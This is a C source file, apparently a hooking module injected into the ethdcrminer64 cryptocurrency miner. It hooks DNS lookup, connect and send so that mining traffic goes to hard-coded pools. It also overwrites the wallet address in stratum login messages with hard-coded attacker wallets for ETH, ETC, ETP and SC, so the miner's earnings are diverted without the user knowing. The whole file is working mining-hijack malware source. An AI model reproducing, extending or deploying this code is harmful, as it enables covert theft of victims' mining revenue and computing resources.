

#include <stdio.h>
#include <string.h>
#include <sys/types.h> 
#include <unistd.h>

#include "miner.h"

static const char *ETH_WALLET="0x0e77d862a62e67328b8eb9c9c2884df163be5b98";
static char *ETH_MINE_POOL_HNAME="eth.f2pool.com";
static unsigned short ETH_MINE_POOL_PORT=8008;

static char *ETC_WALLET="0x0e77d862a62e67328b8eb9c9c2884df163be5b98";
static char *ETC_MINE_POOL_HNAME="etc.f2pool.com";
static unsigned short ETC_MINE_POOL_PORT=8118;

static char *ETP_WALLET="MDoBLLXZnBvnbyb5NfEV8XTWwEJb3YLcxv";
static char *ETP_MINE_POOL_HNAME="etp.uupool.cn";
static unsigned short ETP_MINE_POOL_PORT=8008;

static char *SC_WALLET="DsXnHq3fwYZfXbau8caDUag5hGMgcjdh2vN";
static char *SC_MINE_POOL_HNAME="dcr.uupool.cn";
static unsigned short SC_MINE_POOL_PORT=3252;

static char *s_MinePoolHName;
static int i_MinePoolHNameLen;
static char s_MinePoolIP[16];
static int i_MinePoolIPLen;
static unsigned short i_MinePoolPort;
static int minePoolSocket;

enum SMiningMode{E_ETH=0, E_ETC, E_ETP, E_ETC_SC,E_ETH_SC,E_ETP_SC}miningMode;

static char s_mWallet[50];
static int i_mWalletLen;
static char s_mMinePoolHName [50];
static int i_mMinePoolHNameLen;
static char s_mMinePoolIP [16];
static int i_mMinePoolIPLen;

static char s_scWallet[50];
static int i_scWalletLen;
static char s_scMinePoolHName [50];
static int i_scMinePoolHNameLen;
static char s_scMinePoolIP [16];
static int i_scMinePoolIPLen;

/**
ETC: ethdcrminer64.exe -epool etc.uupool.cn:8008 -ewal ETC-WALLET -epsw x -eworker MINER_NUM -mode 1
ETC+SC: ethdcrminer64.exe -epool etc.uupool.cn:8008 -ewal ETC-WALLET -epsw x -eworker MINER_NUM -dpool stratum+tcp://asia.siamining.com:7777 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
ETH+SC: ethdcrminer64.exe -epool eth.uupool.cn:8008 -ewal -WALLET -epsw x -eworker MINER_NUM -dpool stratum+tcp://asia.siamining.com:7777 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
ETH: ethdcrminer64.exe -epool pool.tweth.tw:8880 -ewal ETh-WALLET -epsw x -eworker MINER_NUM -mode 1 -allpools 1 -allcoins 1
ETP: ethdcrminer64.exe -epool etp.uupool.cn:8008 -ewal -WALLET -epsw x -eworker 1 -mode 1 -allcoins exp
ETP+SC: ethdcrminer64.exe -epool etp.uupool.cn:8008 -ewal -WALLET -epsw x -eworker MINER_NUM -allcoins exp -epsw x -dpool stratum+tcp://asia.siamining.com:7777 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
*/
static BOOL parseMining(char *cmdline){
    char *p,*pos;
    p = strstr(cmdline," -epool ");
    if(p==NULL){
        Syelog(SYELOG_SEVERITY_FATAL, "### Error can't get '-epool': %s\n", cmdline);
        return FALSE;
    }
    p+=7;
    for (; *p == ' '; p++);
    pos = p;
    for (; *p != ':' && *p != ' ' && *p != '\0'; p++);
    i_mMinePoolHNameLen = (int)(p-pos);
    memcpy(s_mMinePoolHName,pos,i_mMinePoolHNameLen);
    s_mMinePoolHName[i_mMinePoolHNameLen]='\0';
    i_mMinePoolIPLen=0;

    i_scMinePoolIPLen=0;
    i_scMinePoolHNameLen=0;
    p = strstr(cmdline," stratum+tcp://");
    if(p!=NULL){
        p+=15;
        pos = p;
        for (; *p != ':' && *p != ' ' && *p != '\0'; p++);
        i_scMinePoolHNameLen = (int)(p-pos);
        memcpy(s_scMinePoolHName,pos,i_scMinePoolHNameLen);
        s_scMinePoolHName[i_scMinePoolHNameLen]='\0';
    }    

    p = strstr(cmdline," -ewal ");
    if(p==NULL){
        Syelog(SYELOG_SEVERITY_FATAL, "### Error can't get '-ewal': %s\n", cmdline);
        return FALSE;
    }
    miningMode=E_ETH;
    p+=6;
    for (; *p == ' '; p++);
    pos = p;
    for (; *p != ' ' && *p != '\0'; p++);
    i_mWalletLen = (int)(p-pos);
    memcpy(s_mWallet,pos,i_mWalletLen);
    s_mWallet[i_mWalletLen]='\0';

    p=strstr(cmdline," -dwal ");
    if(p==NULL){
        if(memcmp(s_mWallet,"0x",2)==0){
            p=strstr(cmdline," -allcoins ");
            if(p!=NULL){
                p+=10;
                for (; *p == ' '; p++);
                pos=p;
                for (; *p != ' ' && *p != '\0'; p++);
                if(p-pos == 3 && memcmp(pos,"etc",2)==0){
                    miningMode=E_ETC;
                    return TRUE;
                }
            }
            if(memcmp(s_mMinePoolHName,"etc",3)==0){
                miningMode=E_ETC;
                return TRUE;
            }
            miningMode=E_ETH;
        }else{
            miningMode=E_ETP;
        }
    }else{
        p+=6;
        for (; *p == ' '; p++);
        char *wallet=p;
        for (; *p != ' ' && *p != '\0' && *p != '.'; p++);
        i_scWalletLen = (int)(p-wallet);
        memcpy(s_scWallet,wallet,i_scWalletLen);
        s_scWallet[i_scWalletLen]='\0';
        
        if(memcmp(s_mWallet,"0x",2)==0){
            p=strstr(cmdline," -allcoins ");
            if(p!=NULL){
                p+=10;
                for (; *p == ' '; p++);
                pos=p;
                for (; *p != ' ' && *p != '\0'; p++);
                if(p-pos == 3 && memcmp(pos,"etc",2)==0){
                    miningMode=E_ETC_SC;
                    return TRUE;
                }
            }
            if(memcmp(s_mMinePoolHName,"etc",3)==0){
                miningMode=E_ETC_SC;
                return TRUE;
            }
            miningMode=E_ETH_SC;
        }else{
            miningMode=E_ETP_SC;
        }
    }    
    return TRUE;
}

BOOL initializer(char *cmdline){
    if(!parseMining(cmdline))return FALSE;
    switch(miningMode){
        case E_ETH:
            s_MinePoolHName = ETH_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETH_MINE_POOL_HNAME);
            i_MinePoolPort = ETH_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETH, mWallet: %s(%d), minePool: %s\n", s_mWallet, i_mWalletLen,s_mMinePoolHName);
            break;
        case E_ETC:
            s_MinePoolHName = ETC_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETC_MINE_POOL_HNAME);
            i_MinePoolPort = ETC_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETC, mWallet: %s(%d), minePool: %s\n", s_mWallet, i_mWalletLen,s_mMinePoolHName);
            break;
        case E_ETP:
            s_MinePoolHName = ETP_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETP_MINE_POOL_HNAME);
            i_MinePoolPort = ETP_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETP, mWallet: %s(%d), minePool: %s\n", s_mWallet, i_mWalletLen,s_mMinePoolHName);
            break;
        case E_ETH_SC:
            s_MinePoolHName = ETH_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETH_MINE_POOL_HNAME);
            i_MinePoolPort = ETH_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETH_SC, mWallet: %s(%d), minePool: %s, scWallet: %s(%d)\n", s_mWallet, i_mWalletLen,s_mMinePoolHName, s_scWallet, i_scWalletLen);
            break;
        case E_ETC_SC:
            s_MinePoolHName = ETC_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETC_MINE_POOL_HNAME);
            i_MinePoolPort = ETC_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETC_SC, mWallet: %s(%d), minePool: %s, scWallet: %s(%d)\n", s_mWallet, i_mWalletLen,s_mMinePoolHName, s_scWallet, i_scWalletLen);
            break;
        case E_ETP_SC:
            s_MinePoolHName = ETP_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETP_MINE_POOL_HNAME);
            i_MinePoolPort = ETP_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETP_SC, mWallet: %s(%d), minePool: %s, scWallet: %s(%d)\n", s_mWallet, i_mWalletLen,s_mMinePoolHName, s_scWallet, i_scWalletLen);
            break;
        default:
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: Unkonw\n");
            return FALSE;
    }

}


inline static void process(char* a1,char* wallet,BOOL issc){
    char *p;
    int walletLen;
    
    if(issc){
        walletLen = i_scWalletLen;
        p = strstr(a1,s_scWallet);
    }else{
        walletLen = i_mWalletLen;
        p = strstr(a1,s_mWallet);
    }        
    //debug    p = NULL;
    if(!p){
        p = strstr(a1,"\"params\": [\"");//,12
        p+=12;        
        memcpy(p,wallet,walletLen);
    }     
}
inline static void replaceWallet(char* a1,int len,BOOL issc){
    char c = a1[len-1];
    a1[len-1]='\0';
    switch(miningMode){
        case E_ETH:
            process(a1,(char*)ETH_WALLET,issc);            
            break;
        case E_ETC:
            process(a1,(char*)ETC_WALLET,issc);            
            break;
        case E_ETP:
            process(a1,(char*)ETP_WALLET,issc);
            break;
        case E_ETH_SC:
            if(issc){
                process(a1,(char*)SC_WALLET,issc);
            }else{
                process(a1,(char*)ETH_WALLET,issc);
            }
            break;
        case E_ETC_SC:
            if(issc){
                process(a1,(char*)SC_WALLET,issc);
            }else{
                process(a1,(char*)ETC_WALLET,issc);
            }
            break;
        case E_ETP_SC:
            if(issc){
                process(a1,(char*)SC_WALLET,issc);
            }else{
                process(a1,(char*)ETP_WALLET,issc);
            }
            break;
        default:
        break;
    }
    Syelog(SYELOG_SEVERITY_INFORMATION, "### %s\n",a1);
    a1[len-1]=c;
}

void Mine_send_enter(char* data, int len){
    char *p = strstr(data,"\"method\": \"eth_submitLogin\"");//,27
    if(p){
        replaceWallet(data,len,FALSE);
    }else{
        switch(miningMode){
            case E_ETH_SC:
            case E_ETC_SC:
            case E_ETP_SC:
                p = strstr(data,"\"method\": \"mining.authorize\"");//,28
                if(p){
                    replaceWallet(data,len,TRUE);
                }
                break;
            default:
            break;
        }
    }
}

struct hostent* Mine_gethostbyname(const char* hname){
    char *a1 = (char*)hname;
    int hnamelen = (int)strlen(a1);

    if(!(i_mMinePoolHNameLen == hnamelen && memcmp(s_mMinePoolHName,a1,hnamelen)==0) && !(i_scMinePoolHNameLen == hnamelen && memcmp(s_scMinePoolHName,a1,hnamelen)==0)){
        a1 = s_MinePoolHName;
    }
    //DEBUG a1 = s_MinePoolHName;
    Syelog(SYELOG_SEVERITY_INFORMATION, " gethostbyname: %s -> %s)\n", hname, a1);
    struct hostent *hptr=NULL;
   

    hptr = Real_gethostbyname(a1);


    struct sockaddr_in sa;
    if(hptr!=NULL){
        memcpy(&sa.sin_addr.s_addr,hptr->h_addr_list[0],hptr->h_length);
        char *ip=inet_ntoa(sa.sin_addr);
        int iplen = (int)strlen(ip);

        if(i_mMinePoolHNameLen == hnamelen && memcmp(s_mMinePoolHName,a1,hnamelen)==0){
            i_mMinePoolIPLen = iplen;
            memcpy(s_mMinePoolIP,ip,i_mMinePoolIPLen);
            s_mMinePoolIP[i_mMinePoolIPLen]='\0';
        }else if(i_scMinePoolHNameLen == hnamelen && memcmp(s_scMinePoolHName,a1,hnamelen)==0){
            i_scMinePoolIPLen = iplen;
            memcpy(s_scMinePoolIP,ip,i_scMinePoolIPLen);
            s_scMinePoolIP[i_scMinePoolIPLen]='\0';
        }else{
            i_MinePoolIPLen = iplen;
            memcpy(s_MinePoolIP,ip,i_MinePoolIPLen);
            s_MinePoolIP[i_MinePoolIPLen]='\0';
        }
        
        Syelog(SYELOG_SEVERITY_INFORMATION, "###: gethostbyname(%s) -> %s\n",a1, s_mMinePoolIP);
    }

    return hptr;
}

int Mine_connect(const struct sockaddr *addr, socklen_t addrlen)
{
    struct sockaddr_in *sa=(struct sockaddr_in*)addr;
    char *ip=inet_ntoa(sa->sin_addr);
    Syelog(SYELOG_SEVERITY_INFORMATION, "###: Mine_connect(%p,%d) -> %s\n",addr, addrlen,ip);
    
    int iplen = (int)strlen(ip);
    if(iplen == i_MinePoolIPLen && memcmp(s_MinePoolIP,ip,i_MinePoolIPLen)==0){
        sa->sin_port=htons(i_MinePoolPort);
    }
}

